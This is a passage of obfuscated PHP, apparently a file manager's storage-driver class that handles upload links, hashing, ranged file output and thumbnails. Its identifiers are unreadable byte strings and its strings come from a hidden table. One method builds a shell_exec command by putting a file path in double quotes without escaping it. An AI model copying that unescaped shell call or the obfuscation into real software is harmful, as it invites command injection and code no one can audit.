trim($this->cdnHost, $¾›¦á€‹[8]), $¥î¤§¼); } public function uploadLink($­š™¢„Ö, $È€Ù « = 0) { $ß„òõªÜ =& $_SERVER[¼èá¯æÙ]; if ($this->isUploadServer()) { return; } $Šı€è‡ò = $this->getType(); if (!in_array($Šı€è‡ò, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $Ì„Âö˜ş = 1024 * 1024 * 10; $¤Ğúª—Ö = $È€Ù « <= $Ì„Âö˜ş ? $ß„òõªÜ[105] : $ß„òõªÜ[106]; $üò¨Ä« = (!$È€Ù « ? 1 : ceil($È€Ù « / pow(1024, 3))) * 3600 * 4; $Ó£áô“Å = $this->{$¤Ğúª—Ö}($­š™¢„Ö, $üò¨Ä«); if ($Ó£áô“Å) { $Ó£áô“Å[$ß„òõªÜ[107]] = $­š™¢„Ö; $Ó£áô“Å[$ß„òõªÜ[108]] = $Šı€è‡ò; } return $Ó£áô“Å; } public function uploadFormData($Ìéµ², $°îõ§ = 3600) { } public function uploadMultiData($áº¤ĞŸé, $ØŞ×» = 3600) { } public function multiUploadFormData($¹åâÑÜ, $†—Ì”¡‚ = 3600) { return $this->uploadMultiData($¹åâÑÜ, $†—Ì”¡‚); } public function download($ÛæŠ÷İ, $üã­öì) { } public function ext($åÊÛÖ×ü) { $Ïúí©äÄ =& $_SERVER[¼èá¯æÙ]; if (strpos($åÊÛÖ×ü, $Ïúí©äÄ[8]) === -1) { $ó£ÅìÃ¦ = $åÊÛÖ×ü; } else { $ó£ÅìÃ¦ = $this->pathThis($åÊÛÖ×ü); } $ÔèíĞ¾ = $Ïúí©äÄ[12]; if (strstr($ó£ÅìÃ¦, $Ïúí©äÄ[10])) { $ÔèíĞ¾ = substr($ó£ÅìÃ¦, strrpos($ó£ÅìÃ¦, $Ïúí©äÄ[10]) + 1); $ÔèíĞ¾ = strtolower($ÔèíĞ¾); } if (strlen($ÔèíĞ¾) > 3 && preg_match($Ïúí©äÄ[109], $ÔèíĞ¾, $™Ã¸Ê¤‰)) { $ÔèíĞ¾ = $Ïúí©äÄ[12]; } return $ÔèíĞ¾; } public function pathThis($ˆ–ƒöÖ ) { $ÁÄä¨ =& $_SERVER[¼èá¯æÙ]; $ˆ–ƒöÖ  = str_replace($ÁÄä¨[110], $ÁÄä¨[8], rtrim($ˆ–ƒöÖ , $ÁÄä¨[8])); $ìâŠÕ˜Ç = strrpos($ˆ–ƒöÖ , $ÁÄä¨[8]); if ($ìâŠÕ˜Ç === !1) { return $ˆ–ƒöÖ ; } return substr($ˆ–ƒöÖ , $ìâŠÕ˜Ç + 1); } public function pathFather($äºÙ¹„ˆ) { $¥¬Ó½Ë½ =& $_SERVER[¼èá¯æÙ]; $äºÙ¹„ˆ = str_replace($¥¬Ó½Ë½[110], $¥¬Ó½Ë½[8], rtrim($äºÙ¹„ˆ, $¥¬Ó½Ë½[8])); $ŠÜ¶ÂãÎ = strrpos($äºÙ¹„ˆ, $¥¬Ó½Ë½[8]); if ($ŠÜ¶ÂãÎ === !1) { return $¥¬Ó½Ë½[12]; } return substr($äºÙ¹„ˆ, 0, $ŠÜ¶ÂãÎ + 1); } public function hashSimple($‘Ç†´¤‘) { $À½óº‘è =& $_SERVER[¼èá¯æÙ]; if (!$‘Ç†´¤‘) { return md5($À½óº‘è[12]); } $•µµøåô = $this->size($‘Ç†´¤‘); $˜»úÖ™ = 200; $çÌÛ’”¯ = 50; if ($•µµøåô <= $˜»úÖ™ * $çÌÛ’”¯) { return $this->hashMd5($‘Ç†´¤‘) . $•µµøåô; } $èÔ‘ˆ‹å = intval($•µµøåô / $çÌÛ’”¯); $†„¤éĞ¾ = $À½óº‘è[12]; for ($´¿­â–‡ = 0; $´¿­â–‡ < $çÌÛ’”¯; $´¿­â–‡++) { $†„¤éĞ¾ .= $this->fileSubstr($‘Ç†´¤‘, $èÔ‘ˆ‹å * $´¿­â–‡, $˜»úÖ™); } $†„¤éĞ¾ .= $this->fileSubstr($‘Ç†´¤‘, $•µµøåô - $˜»úÖ™, $˜»úÖ™); return md5($†„¤éĞ¾) . $•µµøåô; } public static $md5Cache = array(); public function hashMd5($ï Ä¶Ïì) { if (!$ï Ä¶Ïì) { return md5($_SERVER[¼èá¯æÙ][12]); } $ï Ä¶Ïì = $this->iconvSystem($ï Ä¶Ïì); if (isset(self::$md5Cache[$ï Ä¶Ïì])) { return self::$md5Cache[$ï Ä¶Ïì]; } self::$md5Cache[$ï Ä¶Ïì] = $this->hashMd5Shell($ï Ä¶Ïì); if (!self::$md5Cache[$ï Ä¶Ïì]) { self::$md5Cache[$ï Ä¶Ïì] = @md5_file($ï Ä¶Ïì); } return self::$md5Cache[$ï Ä¶Ïì]; } private function hashMd5Shell($‡¡ÓØıñ) { $è¶“°ºÑ =& $_SERVER[¼èá¯æÙ]; if (!$‡¡ÓØıñ) { return md5($è¶“°ºÑ[12]); } if (!function_exists($è¶“°ºÑ[111])) { return !1; } $æ³ÔİÖ– = array($è¶“°ºÑ[112], $è¶“°ºÑ[113]); $ú×åƒ¡› = Cache::get($è¶“°ºÑ[114]); if (!$ú×åƒ¡›) { $›ã’àˆ = BASIC_PATH . $è¶“°ºÑ[115]; $¡ÆÛµ¶Œ = md5_file($›ã’àˆ); $ú×åƒ¡› = $è¶“°ºÑ[116]; foreach ($æ³ÔİÖ– as $ÑåªÌ´ş) { $¾¬¾Ó´† = shell_exec($ÑåªÌ´ş . "\x20\x22{$›ã’àˆ}\42"); if ($¾¬¾Ó´† && substr(trim($¾¬¾Ó´†), 0, 32) == $¡ÆÛµ¶Œ) { $ú×åƒ¡› = $ÑåªÌ´ş; break; } } Cache::set($è¶“°ºÑ[114], $ú×åƒ¡›, 3600); } if ($ú×åƒ¡› == $è¶“°ºÑ[116]) { return !1; } $¾¬¾Ó´† = shell_exec($ú×åƒ¡› . "\40\42{$‡¡ÓØıñ}\x22"); $¾¬¾Ó´† = str_replace($è¶“°ºÑ[117], $è¶“°ºÑ[12], $¾¬¾Ó´†); return substr($¾¬¾Ó´†, 0, 32); } public function link($•áíÉ»å) { return $•áíÉ»å; } public function fileOut($ä½±ûûì, $”‡¶¥‚Ï = false, $Ôö‘¤½Ó = false, $‡·œ×ææ = '') { $Ñ¹²ÅŒå =& $_SERVER[¼èá¯æÙ]; $this->cacheMethod(null, null); if (!$ä½±ûûì || !$this->exist($ä½±ûûì)) { show_json(LNG($Ñ¹²ÅŒå[118]), !1, $Ôö‘¤½Ó); } $ÙÅáŸº§ = $this->getType() == $Ñ¹²ÅŒå[119]; $­ş£Øä = $GLOBALS[$Ñ¹²ÅŒå[6]][$Ñ¹²ÅŒå[102]][$Ñ¹²ÅŒå[120]][$Ñ¹²ÅŒå[121]]; $¼Ä†Œİš = (double) $GLOBALS[$Ñ¹²ÅŒå[6]][$Ñ¹²ÅŒå[102]][$Ñ¹²ÅŒå[120]][$Ñ¹²ÅŒå[122]] * 1024 * 1024; @ob_end_clean(); set_timeout(); $ä¼‰§”Ó = $this->infoFull($ä½±ûûì); $¹®¾™µ· = $ä¼‰§”Ó[$Ñ¹²ÅŒå[89]]; $ ê¹Êôî = gmdate($Ñ¹²ÅŒå[123], $ä¼‰§”Ó[$Ñ¹²ÅŒå[98]]); $…ƒ—ƒÛ÷ = $Ôö‘¤½Ó ? $Ôö‘¤½Ó : $this->iconvApp($ä¼‰§”Ó[$Ñ¹²ÅŒå[32]]); $ğüø† = 0; $ÂÇá¥°ú = $¹®¾™µ· - 1; $¯õ«íºØ = $this->ext($…ƒ—ƒÛ÷); if (in_array($¯õ«íºØ, array($Ñ¹²ÅŒå[124], $Ñ¹²ÅŒå[125], $Ñ¹²ÅŒå[126], $Ñ¹²ÅŒå[127]))) { $¯õ«íºØ = $Ñ¹²ÅŒå[128]; } if (in_array($¯õ«íºØ, array($Ñ¹²ÅŒå[129]))) { $¯õ«íºØ = $Ñ¹²ÅŒå[130]; } if (!$‡·œ×ææ) { $‡·œ×ææ = md5($ ê¹Êôî . $¹®¾™µ·); } $‡·œ×ææ = $Ñ¹²ÅŒå[131] . $‡·œ×ææ . $Ñ¹²ÅŒå[131]; $Ãºß€¹ = get_file_mime($¯õ«íºØ); $¢»ƒŸ»Ä = !0; $¢»ƒŸ»Ä = isset($_GET[$Ñ¹²ÅŒå[132]]) ? !1 : !0; if ($”‡¶¥‚Ï === !1 && !mime_support($Ãºß€¹)) { $Ãºß€¹ = $Ñ¹²ÅŒå[133]; } header($Ñ¹²ÅŒå[134]); header($Ñ¹²ÅŒå[135] . $Ãºß€¹); $úáÆÆ”‰ = rawurlencode($…ƒ—ƒÛ÷); $úáÆÆ”‰ = $Ñ¹²ÅŒå[131] . $úáÆÆ”‰ . $Ñ¹²ÅŒå[136] . $úáÆÆ”‰; if ($”‡¶¥‚Ï) { header($Ñ¹²ÅŒå[137]); header($Ñ¹²ÅŒå[138] . $úáÆÆ”‰); } else { if ($¢»ƒŸ»Ä) { header($Ñ¹²ÅŒå[139] . $úáÆÆ”‰); } } $¯ëÂš¯ù = 3600 * 24 * 30; header($Ñ¹²ÅŒå[140]); header($Ñ¹²ÅŒå[141]); header($Ñ¹²ÅŒå[142] . $¯ëÂš¯ù); header($Ñ¹²ÅŒå[143] . gmdate($Ñ¹²ÅŒå[123], time() + $¯ëÂš¯ù) . $Ñ¹²ÅŒå[144]); if (isset($_SERVER[$Ñ¹²ÅŒå[145]]) && strtotime($_SERVER[$Ñ¹²ÅŒå[145]]) == $ä¼‰§”Ó[$Ñ¹²ÅŒå[98]]) { header($Ñ¹²ÅŒå[146], !0, 304); die; } if (isset($_SERVER[$Ñ¹²ÅŒå[147]]) && $_SERVER[$Ñ¹²ÅŒå[147]] == $‡·œ×ææ) { header($Ñ¹²ÅŒå[148] . $‡·œ×ææ, !0, 304); die; } header($Ñ¹²ÅŒå[148] . $‡·œ×ææ); header($Ñ¹²ÅŒå[149] . $ ê¹Êôî . $Ñ¹²ÅŒå[144]); header($Ñ¹²ÅŒå[150] . $…ƒ—ƒÛ÷); header($Ñ¹²ÅŒå[151]); header($Ñ¹²ÅŒå[152] . $¹®¾™µ·); header($Ñ¹²ÅŒå[153]); Hook::trigger($Ñ¹²ÅŒå[154], $ä½±ûûì, $¹®¾™µ·, $…ƒ—ƒÛ÷, $¯õ«íºØ); if (!$”‡¶¥‚Ï && $¯õ«íºØ == $Ñ¹²ÅŒå[155]) { if ($¹®¾™µ· > 1024 * 1024 * 5) { die; } $¬ÎåÑŸÌ = $this->getContent($ä½±ûûì); $¬ÎåÑŸÌ = Html::clearSVG($¬ÎåÑŸÌ); header($Ñ¹²ÅŒå[156] . strlen($¬ÎåÑŸÌ)); echo $¬ÎåÑŸÌ; die; } $ëˆÉ«”Ï = strtolower($_SERVER[$Ñ¹²ÅŒå[157]]); if ($ÙÅáŸº§ && $ëˆÉ«”Ï && $­ş£Øä) { if (strstr($ëˆÉ«”Ï, $Ñ¹²ÅŒå[158])) { header($Ñ¹²ÅŒå[159] . $ä½±ûûì); } else { if (strstr($ëˆÉ«”Ï, $Ñ¹²ÅŒå[160])) { header($Ñ¹²ÅŒå[161] . $ä½±ûûì); } else { if (strstr($ëˆÉ«”Ï, $Ñ¹²ÅŒå[162])) { header($Ñ¹²ÅŒå[163] . $ä½±ûûì); } } } if ($¼Ä†Œİš) { header($Ñ¹²ÅŒå[164] . $¼Ä†Œİš); } return; } if (isset($_SERVER[$Ñ¹²ÅŒå[165]])) { if (preg_match($Ñ¹²ÅŒå[166], $_SERVER[$Ñ¹²ÅŒå[165]], $—“¾©Ò)) { $ğüø† = intval($—“¾©Ò[1]); $ğüø† = $ğüø† <= 0 ? 0 : ($ğüø† >= $ÂÇá¥°ú ? $ÂÇá¥°ú : $ğüø†); if (!empty($—“¾©Ò[2])) { $é²«º÷Ü = intval($—“¾©Ò[2]); $ÂÇá¥°ú = $é²«º÷Ü < $ğüø† ? $ğüø† : ($é²«º÷Ü >= $ÂÇá¥°ú ? $ÂÇá¥°ú : $é²«º÷Ü); } } header($Ñ¹²ÅŒå[167]); header("\103\x6f\x6e\164\x65\x6e\164\55\x52\141\156\x67\145\x3a\40\x62\171\x74\x65\x73\x20{$ğüø†}\x2d{$ÂÇá¥°ú}\x2f" . $¹®¾™µ·); } else { header($Ñ¹²ÅŒå[168]); } header($Ñ¹²ÅŒå[169]); header($Ñ¹²ÅŒå[170]); $”±ßğÆğ = !0; if ($_SERVER[$Ñ¹²ÅŒå[171]] == $Ñ¹²ÅŒå[172] && $¹®¾™µ· > 1204 * 1024 * 1024 * 2) { $”±ßğÆğ = !1; } if ($”±ßğÆğ) { header($Ñ¹²ÅŒå[173] . ($ÂÇá¥°ú - $ğüø† + 1)); } if ($_SERVER[$Ñ¹²ÅŒå[174]] == $Ñ¹²ÅŒå[175]) { return; } $–ò ì¡£ = array($Ñ¹²ÅŒå[176] => !1, $Ñ¹²ÅŒå[177] => $ğüø†, $Ñ¹²ÅŒå[178] => $ÂÇá¥°ú, $Ñ¹²ÅŒå[179] => $¯õ«íºØ, $Ñ¹²ÅŒå[180] => $ä¼‰§”Ó, $Ñ¹²ÅŒå[181] => $Ñ¹²ÅŒå[12], $Ñ¹²ÅŒå[182] => 0); $–ò ì¡£ = Hook::filter($Ñ¹²ÅŒå[183], $–ò ì¡£); $–Ûó…¿Ë = 1024 * 300; $ëºÙÎî§ = 0; if ($¼Ä†Œİš) { $ëºÙÎî§ = intval(1000 * 1000 * ($–Ûó…¿Ë / $¼Ä†Œİš)); } while ($ğüø† <= $ÂÇá¥°ú) { $ğí“ÉÙ« = timeFloat(); check_abort(); $‚¾Íæ×İ = $ÂÇá¥°ú - $ğüø† + 1; if ($‚¾Íæ×İ <= $–Ûó…¿Ë) { $–Ûó…¿Ë = $‚¾Íæ×İ; } $¬ÎåÑŸÌ = $this->fileSubstr($ä½±ûûì, $ğüø†, $–Ûó…¿Ë); if ($–ò ì¡£[$Ñ¹²ÅŒå[176]]) { $–ò ì¡£[$Ñ¹²ÅŒå[181]] = $¬ÎåÑŸÌ; $–ò ì¡£[$Ñ¹²ÅŒå[182]] = $ğüø†; $–ò ì¡£ = Hook::filter($Ñ¹²ÅŒå[184], $–ò ì¡£); $¬ÎåÑŸÌ = $–ò ì¡£[$Ñ¹²ÅŒå[181]]; } echo $¬ÎåÑŸÌ; $ğüø† += $–Ûó…¿Ë; if ($–Ûó…¿Ë == $‚¾Íæ×İ) { $ğüø† = $ÂÇá¥°ú + 1; } if ($ëºÙÎî§) { $¿¬¶ó = intval(1000 * 1000 * (timeFloat() - $ğí“ÉÙ«)); $¯çŠ”»š = $ëºÙÎî§ - $¿¬¶ó; if ($¯çŠ”»š > 5) { usleep($¯çŠ”»š); } } } } public function fileOutServer($ŞÓ¹øóç, $¤ìÉ„ÉŞ = false, $ãé±½¸ = false, $«€Ú¸øÎ = '') { $this->fileOut($ŞÓ¹øóç, $¤ìÉ„ÉŞ, $ãé±½¸, $«€Ú¸øÎ); } public function fileOutLink($ëÌõ­İ) { header($_SERVER[¼èá¯æÙ][185] . $ëÌõ­İ); die; } public function cacheMethod($ğğÒûà, $½‹´òú›, $îÚ¤ğ = null) { $Î€¼Ğè =& $_SERVER[¼èá¯æÙ]; static $ì£¾½»¦ = array(); $Åã·Ì¥Ë = $½‹´òú› ? ltrim($this->getPathOuter($½‹´òú›), $Î€¼Ğè[8]) : $Î€¼Ğè[12]; $«²ù = $Î€¼Ğè[186] . $ğğÒûà . $Î€¼Ğè[187] . rtrim($Åã·Ì¥Ë, $Î€¼Ğè[8]); if (is_null($ğğÒûà)) { $ì£¾½»¦ = array(); return; } if (is_null($½‹´òú›)) { foreach ($ì£¾½»¦ as $«²ù => $œğ”ššº) { if (!strstr($«²ù, $Î€¼Ğè[186] . $ğğÒûà . $Î€¼Ğè[188])) { continue; } unset($ì£¾½»¦[$«²ù]); } return; } if (!is_null($îÚ¤ğ)) { $ì£¾½»¦[$«²ù] = $îÚ¤ğ; return; } $×ß­Ñì = isset($ì£¾½»¦[$«²ù]) ? $ì£¾½»¦[$«²ù] : null; if (!is_null($×ß­Ñì)) { return $×ß­Ñì; } $×ß­Ñì = $this->{$ğğÒûà}($½‹´òú›); $ì£¾½»¦[$«²ù] = $×ß­Ñì; return $×ß­Ñì; } public function cacheMethodInfoSet($¿‘úÙë, $ƒÖÈÊ¦, $èÛôƒé¶ = false) { $Ô½†¦Áë =& $_SERVER[¼èá¯æÙ]; if ($this->listItemCache === !1) { return; } $this->cacheMethod($Ô½†¦Áë[189], $¿‘úÙë, $ƒÖÈÊ¦); $this->cacheMethod($Ô½†¦Áë[190], $¿‘úÙë, $ƒÖÈÊ¦ ? !1 : !0); if (is_array($èÛôƒé¶)) { $this->cacheMethod($Ô½†¦Áë[191], $¿‘úÙë, $èÛôƒé¶); } } public function fileOutImage($‰—ã¡Æ‚, $ìğ½Å² = 250) { $Ô„½û¨ =& $_SERVER[¼èá¯æÙ]; set_timeout(); if (substr($‰—ã¡Æ‚, 0, 4) == $Ô„½û¨[162]) { $this->fileOutLink($‰—ã¡Æ‚); } $ñº—±Ö‡ = $this->info($‰—ã¡Æ‚); $ø«Œ×šÁ = !1; $ïœ»¥• = isset($GLOBALS[$Ô„½û¨[192]]) ? $GLOBALS[$Ô„½û¨[192]] : array(); if ($ïœ»¥• && $ïœ»¥•[$Ô„½û¨[193]] == $ñº—±Ö‡[$Ô„½û¨[97]]) { $ñº—±Ö‡ = $ïœ»¥•; $“½œöè = $ñº—±Ö‡[$Ô„½û¨[194]]; if ($“½œöè && isset($“½œöè[$Ô„½û¨[195]])) { if ($“½œöè[$Ô„½û¨[195]] <= $ìğ½Å² && $“½œöè[$Ô„½û¨[196]] <= $ìğ½Å²) { $ø«Œ×šÁ = !0; } } } if ($ñº—±Ö‡[$Ô„½û¨[89]] <= 1024 * 50 || $ø«Œ×šÁ || !function_exists($Ô„½û¨[197]) || $ñº—±Ö‡[$Ô„½û¨[179]] == $Ô„½û¨[198]) { return $this->fileOut($‰—ã¡Æ‚, !1, $ñº—±Ö‡[$Ô„½û¨[32]]); } $øøº©¬İ = kodIO::hashPath($ñº—±Ö‡); $ÃÃ’§± = "\143\157\166\145\162\x5f{$øøº©¬İ}\x5f{$ìğ½Å²}\x2e\x70\156\x67"; $‡ßæ¥ú = IO_PATH_SYSTEM_TEMP . $Ô„½û¨[199]; $Ú¯ìøÍ¹ = IO::infoFullSimple($‡ßæ¥ú); $‰¹ç†¶ğ = $Ú¯ìøÍ¹ && is_array($Ú¯ìøÍ¹) ? $Ú¯ìøÍ¹[$Ô„½û¨[97]] : $Ô„½û¨[12]; if (!$‰¹ç†¶ğ) { $‰¹ç†¶ğ = IO::mkdir($‡ßæ¥ú); } if ($ñº—±Ö‡[$Ô„½û¨[200]] == $Ô„½û¨[201] && isset($ñº—±Ö‡[$Ô„½û¨[202]]) && $ñº—±Ö‡[$Ô„½û¨[202]] == kodIO::sourceID($‰¹ç†¶ğ)) { $ğ÷¡ü = $ñº—±Ö‡[$Ô„½û¨[203]]; if ($ìğ½Å² <= 500) { $£ŞÃË»× = preg_replace($Ô„½û¨[204], $Ô„½û¨[205], $ñº—±Ö‡[$Ô„½û¨[32]]); $ğ÷¡ü = IO::fileNameExist($‰¹ç†¶ğ, $£ŞÃË»×); } return IO::fileOut(KodIO::make($ğ÷¡ü), !1, $ñº—±Ö‡[$Ô„½û¨[32]]); } $•²‘½•™ = IO::fileNameExist($‰¹ç†¶ğ, $ÃÃ’§±); if ($•²‘½•™) { return IO::fileOut(KodIO::make($•²‘½•™), !1, $ñº—±Ö‡[$Ô„½û¨[32]]); } if ($ìğ½Å² > 1000) { $this->makeImageCover($‰¹ç†¶ğ, $‰—ã¡Æ‚, $ÃÃ’§±, $ìğ½Å²); $this->makeImageCover($‰¹ç†¶ğ, $‰—ã¡Æ‚, "\x63\157\x76\x65\162\137{$øøº©¬İ}\137\x32\x35\60\56\160\x6e\x67", 250); $•²‘½•™ = IO::fileNameExist($‰¹ç†¶ğ, $ÃÃ’§±); if ($•²‘½•™) { return IO::fileOut(KodIO::make($•²‘½•™), !1, $ñº—±Ö‡[$Ô„½û¨[32]]); } die; } if (!kodIO::allowCover($ñº—±Ö‡)) { return $this->fileOut($‰—ã¡Æ‚, !1, $ñº—±Ö‡[$Ô„½û¨[32]]); } $ûØ§ß  = Cache::get($ÃÃ’§±); if ($ûØ§ß  == $Ô„½û¨[206] || $ûØ§ß  == $Ô„½û¨[207]) { echo $ûØ§ß ; die; } Cache::set($ÃÃ’§±, $Ô„½û¨[207], 60); $ÕÑŒ±À¯ = array($‰¹ç†¶ğ, $ñº—±Ö‡[$Ô„½û¨[97]], $ÃÃ’§±, $ìğ½Å²); $ß¤Ğ„ö– = $Ô„½û¨[208] . $ñº—±Ö‡[$Ô„½û¨[89]] . $Ô„½û¨[209] . $ÃÃ’§± . $Ô„½û¨[210] . $ñº—±Ö‡[$Ô„½û¨[32]] . $Ô„½û¨[211] . $ñº—±Ö‡[$Ô„½û¨[97]]; TaskQueue::add($Ô„½û¨[212], $ÕÑŒ±À¯, $ß¤Ğ„ö–, $ÃÃ’§±); } public function makeImageCover($äÙÌ—¦, $½ÆÍ™ƒ±, $ìÌÁÑ×â, $‚ßœ“™¡) { $É†ïˆé =& $_SERVER[¼èá¯æÙ]; if (IO::fileNameExist($äÙÌ—¦, $ìÌÁÑ×â)) { return $É†ïˆé[213]; } if (!is_dir(DATA_THUMB)) { mk_dir(DATA_THUMB); } if (!is_dir(TEMP_FILES)) { mk_dir(TEMP_FILES); } $ÄÓÏë = $this->getPathOuter($½ÆÍ™ƒ±); $òê–¹ì¶ = DATA_THUMB . $ìÌÁÑ×â; del_file($òê–¹ì¶); $ˆ¼ÖÔ„ = IO::copy($ÄÓÏë, TEMP_FILES, !1, $ìÌÁÑ×â); if (!@file_exists($ˆ¼ÖÔ„)) { return $É†ïˆé[214]; } ImageThumb::createThumb($ˆ¼ÖÔ„, $òê–¹ì¶, $‚ßœ“™¡, $‚ßœ“™¡ * 10); if (@file_exists($òê–¹ì¶)) { Cache::remove($ìÌÁÑ×â); return IO::move($òê–¹ì¶, $äÙÌ—¦); } Cache::set($ìÌÁÑ×â, $É†ïˆé[206], 600); del_file($òê–¹ì¶); return $É†ïˆé[215] . $ˆ¼ÖÔ„ . $É†ïˆé[84]; } public function fileOutImageServer($Úìñ½Ø, $¾Û¤”ç› = 250) { $this->fileOutImage($Úìñ½Ø, $¾Û¤”ç›); } public function fileNameAuto($Üèô’º™, $ù›ãƒé“, $‹ßüÄ™Î = REPEAT_RENAME, $àô”„‰Â = false) { $šï–úüç =& $_SERVER[¼èá¯æÙ]; $±ÚÊ«ÔÓ = $Üèô’º™ === $šï–úüç[12] ? $ù›ãƒé“ : rtrim($Üèô’º™, $šï–úüç[8]) . $šï–úüç[8] . $ù›ãƒé“; if ($‹ßüÄ™Î == REPEAT_REPLACE || !$this->exist($±ÚÊ«ÔÓ) || $àô”„‰Â && $‹ßüÄ™Î != REPEAT_RENAME_FOLDER) { return $ù›ãƒé“; } if ($‹ßüÄ™Î == REPEAT_SKIP) { return !1; } $¢ô÷Ö«¥ = $šï–úüç[10] . get_path_ext($ù›ãƒé“); $¢ô÷Ö«¥ = $¢ô÷Ö«¥ == $šï–úüç[10] || $àô”„‰Â ? $šï–úüç[12] : $¢ô÷Ö«¥; $ÓÇÌ°”¦ = 1; $È€³˜¸ = substr($ù›ãƒé“, 0, strlen($ù›ãƒé“) - strlen($¢ô÷Ö«¥)); $©å­°Å = $È€³˜¸ . "\x28{$ÓÇÌ°”¦}\51{$¢ô÷Ö«¥}"; while ($this->exist(rtrim($Üèô’º™, $šï–úüç[8]) . $šï–úüç[8] . $©å­°Å)) { $©å­°Å = $È€³˜¸ . "\x28{$ÓÇÌ°”¦}\x29{$¢ô÷Ö«¥}"; $ÓÇÌ°”¦++; } return $©å­°Å; } private function fileNameAutoList($åß˜€ÖÅ, $˜Â«‘Õâ, $Éøİ­ŠÎ = false) { $©—şæà =& $_SERVER[¼èá¯æÙ]; $‰å˜ŸİÖ = $this->listPath($åß˜€ÖÅ, !0); $‰å˜ŸİÖ = array_merge($‰å˜ŸİÖ[$©—şæà[95]], $‰å˜ŸİÖ[$©—şæà[96]]); $á¸±éŒÅ = array_to_keyvalue($‰å˜ŸİÖ, $©—şæà[12], $©—şæà[32]); $µ¨ãŞ = $©—şæà[10] . get_path_ext($˜Â«‘Õâ); $µ¨ãŞ = $µ¨ãŞ == $©—şæà[10] || $Éøİ­ŠÎ ? $©—şæà[12] : $µ¨ãŞ; $Î®Úıá€ = substr($˜Â«‘Õâ, 0, strlen($˜Â«‘Õâ) - strlen($µ¨ãŞ)); $Ç±îîÚ› = $Î®Úıá€ . "\50\60\x29{$µ¨ãŞ}"; for ($Ê¾ü€ÑÎ = 1; $Ê¾ü€ÑÎ <= count($á¸±éŒÅ) + 1; $Ê¾ü€ÑÎ++) { $Ç±îîÚ› = $Î®Úıá€ . "\50{$Ê¾ü€ÑÎ}\51{$µ¨ãŞ}"; if (!in_array_not_case($Ç±îîÚ›, $á¸±éŒÅ)) { return $Ç±îîÚ›; } } return $Ç±îîÚ›; } public function listAllFiles($åªŒñíš, $£Šå»ıê) { $ÍÍøÇı =& $_SERVER[¼èá¯æÙ]; if (empty($£Šå»ıê)) { return array(); } $ÂİœØü = array_keys($£Šå»ıê); $”êØôª† = array(); $åªŒñíš = trim($åªŒñíš, $ÍÍøÇı[8]); foreach ($£Šå»ıê as $÷÷§¨§Ş => $ëíÀµıô) { $ Ú´ªÅ› = ltrim(substr(trim($÷÷§¨§Ş, $ÍÍøÇı[8]), strlen($åªŒñíš)), $ÍÍøÇı[8]); if (substr($÷÷§¨§Ş, -1) == $ÍÍøÇı[8]) { $ Ú´ªÅ› = rtrim($ Ú´ªÅ›, $ÍÍøÇı[8]) . $ÍÍøÇı[8]; } $”êØôª† = array_merge($”êØôª†, $this->slicePath($ Ú´ªÅ›)); } $»„ÇâÏÄ = array(); foreach (array_unique($”êØôª†) as $®ÔõÅ·õ) { $¦¢›éÕå = array($ÍÍøÇı[97] => $this->getPathOuter($ÍÍøÇı[8] . $åªŒñíš . $ÍÍøÇı[8] . $®ÔõÅ·õ), $ÍÍøÇı[88] => 1, $ÍÍøÇı[89] => 0); if (substr($®ÔõÅ·õ, -1) != $ÍÍøÇı[8]) { $¦¢›éÕå[$ÍÍøÇı[88]] = 0; $¾ä›Úóô = $this->getPath($åªŒñíš . $ÍÍøÇı[8] . $®ÔõÅ·õ); if (isset($£Šå»ıê[$¾ä›Úóô])) { $·­Ö”âú = $£Šå»ıê[$¾ä›Úóô]; if (isset($·­Ö”âú[$ÍÍøÇı[89]])) { $¦¢›éÕå[$ÍÍøÇı[89]] = intval($·­Ö”âú[$ÍÍøÇı[89]]); } if (isset($·­Ö”âú[$ÍÍøÇı[216]])) { $¦¢›éÕå[$ÍÍøÇı[98]] = intval($·­Ö”âú[$ÍÍøÇı[216]]); } } } $»„ÇâÏÄ[] = $¦¢›éÕå; } return $»„ÇâÏÄ; } public function slicePath($Êê”×) { $¡§ ¨ïØ =& $_SERVER[¼èá¯æÙ]; $Á÷Ì¶£í = explode($¡§ ¨ïØ[8], trim($Êê”×, $¡§ ¨ïØ[8])); $ğĞ’¡Œî = 0; do { ++$ğĞ’¡Œî; $÷•½³ãÙ[] = implode($¡§ ¨ïØ[8], array_slice($Á÷Ì¶£í, 0, $ğĞ’¡Œî)) . $¡§ ¨ïØ[8]; } while ($ğĞ’¡Œî < count($Á÷Ì¶£í)); $÷•½³ãÙ[count($Á÷Ì¶£í) - 1] = $Êê”×; return $÷•½³ãÙ; } public function getHost() { $«Ê÷…² =& $_SERVER[¼èá¯æÙ]; $”â˜ú÷ = parse_url(trim($this->domain, $«Ê÷…²[8])); $˜½ Ñ® = isset($”â˜ú÷[$«Ê÷…²[217]]) ? $”â˜ú÷[$«Ê÷…²[217]] : http_type(); $•Ã§ı†á = isset($”â˜ú÷[$«Ê÷…²[218]]) ? $”â˜ú÷[$«Ê÷…²[218]] : $”â˜ú÷[$«Ê÷…²[97]]; if (isset($”â˜ú÷[$«Ê÷…²[219]])) { $•Ã§ı†á .= $«Ê÷…²[4] . $”â˜ú÷[$«Ê÷…²[219]]; } return $˜½ Ñ® . $«Ê÷…²[220] . $•Ã§ı†á; } public function pathEncode($˜Î·š„) { $ÖÁùº™å =& $_SERVER[¼èá¯æÙ]; return str_replace($ÖÁùº™å[221], $ÖÁùº™å[8], rawurlencode($˜Î·š„)); } public function writeLog($Ş¾Êƒëö = '', $µ«ã¸Í = false) { $ÂÈÀğõ¾ =& $_SERVER[¼èá¯æÙ]; $Çò¯Åò = in_array(ACTION, array($ÂÈÀğõ¾[222], $ÂÈÀğõ¾[223])); if (!$Çò¯Åò && !GLOBAL_DEBUG) { return; } $¶š³‰¶ = $Ş¾Êƒëö; static $öŠŒÌ©÷ = null; if (!$öŠŒÌ©÷) { $öŠŒÌ©÷ = strtoupper($this->getType()); } $Ş¾Êƒëö = $öŠŒÌ©÷ . $ÂÈÀğõ¾[224] . $Ş¾Êƒëö; if ($µ«ã¸Í) { $¡„‰š¿· = error_get_last(); if ($¡„‰š¿·) { $Ş¾Êƒëö = array($Ş¾Êƒëö, $¡„‰š¿·); } } write_log($Ş¾Êƒëö, $ÂÈÀğõ¾[225]); if ($Çò¯Åò) { throw new Exception($¶š³‰¶); } } } class PathDriverBaseS3 extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $useSSL = false; protected $region = ''; protected $endpoint = ''; protected $bucket = ''; protected $client = null; protected $signVer = "\x76\64"; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\x30"; public $config = 